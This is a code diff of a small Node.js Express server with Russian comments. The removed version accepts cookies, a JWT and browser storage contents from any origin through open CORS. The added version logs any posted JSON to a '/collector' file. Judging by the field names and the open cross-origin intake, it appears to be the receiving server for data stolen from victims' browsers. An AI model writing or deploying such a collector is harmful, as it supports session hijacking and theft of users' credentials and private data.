@@ -1,42 +1,37 @@
-// server.js
 const express = require('express');
-const jwtLib  = require('jsonwebtoken');
-const app     = express();
+const fs = require('fs');
+const path = require('path');
 
-const JWT_SECRET = '…ваш секрет JWT…';
+const app = express();
+const PORT = 3000;
 
-app.use(express.json());
-app.use((req, res, next) => {
-  res.header('Access-Control-Allow-Origin',  '*');
-  res.header('Access-Control-Allow-Methods', 'POST,OPTIONS');
-  res.header('Access-Control-Allow-Headers', 'Content-Type,Authorization');
-  if (req.method === 'OPTIONS') return res.sendStatus(204);
-  next();
+// Парсинг JSON
+app.use(express.json({ limit: '1mb' }));
+
+// Обработчик /collector
+app.post('/collector', (req, res) => {
+  const data = req.body;
+  const timestamp = new Date().toISOString();
+
+  // Добавим временную метку
+  data._receivedAt = timestamp;
+
+  // Путь к лог-файлу
+  const logPath = path.join(__dirname, 'log.json');
+
+  // Сохраняем
+  fs.appendFile(logPath, JSON.stringify(data, null, 2) + ',\n', err => {
+    if (err) {
+      console.error('[S-1] Ошибка записи:', err);
+      return res.status(500).send('Ошибка');
+    }
+
+    console.log('[S-1] Данные получены и сохранены.');
+    res.status(204).end(); // Нет содержимого
+  });
 });
 
-function handleCollect(req, res) {
-  const { cookies = [], jwt = null, storage = {}, timestamp = null } = req.body;
-  let validJwt = false;
-  if (jwt) {
-    try { jwtLib.verify(jwt, JWT_SECRET); validJwt = true; }
-    catch (e) { console.warn('Invalid JWT:', e.message); }
-  }
-  console.log('--- New collection @', timestamp);
-  console.log('JWT valid:', validJwt);
-  console.log('Cookies:', cookies);
-  console.log('Storage keys:', Object.keys(storage).length);
-
-  res.json({
-    status: 'ok',
-    jwtValid: validJwt,
-    receivedCookies: cookies.length,
-    receivedStorage: Object.keys(storage).length
-  });
-}
-
-// теперь оба пути обрабатываются одинаково
-app.post('/collect', handleCollect);
-app.post('/',        handleCollect);
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server listening on ${PORT}`));
+// Запуск сервера
+app.listen(PORT, () => {
+  console.log(`[S-1] Сервер слушает на http://localhost:${PORT}`);
+});
